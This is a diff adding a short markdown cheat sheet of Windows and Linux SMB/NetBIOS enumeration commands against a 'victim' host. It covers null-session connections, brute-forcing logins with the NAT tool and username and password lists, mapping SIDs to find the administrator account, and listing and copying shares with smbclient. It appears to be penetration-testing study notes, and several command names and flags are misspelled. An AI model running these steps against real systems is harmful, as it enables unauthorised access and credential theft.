@@ -1,0 +1,29 @@
+## WINDOWS COMMANDS
+
+⚡ nbtstat -A 192.168.1.202
+
+⚡ net view 192.168.1.202 
+
+⚡ netuse /? 
+
+⚡ netuse  \\file\path
+
+⚡ nat.exe -u uname.list -p pass.list 192.168.1.202
+
+⚡ winfignerprint (must run as admin) (keep the SID value for later use) 
+
+⚡ net use \\file\path\ipc$ "" /use:" (null session) 
+
+⚡ sid2user \\victim\name SID from above and replace (-) with spaces. last number of SID impersonate a user 500(admin) 
+
+⚡ dumpsec 
+
+## LINUX COMMANDS
+
+⚡ enum4linux -a 192.168.1.202 -v  
+
+⚡ smbclient -L 192.168.1.202 
+
+⚡ smbclient \\\\192.168.1.202\\folde\to\access ( 'get' to copy files) 
+
+
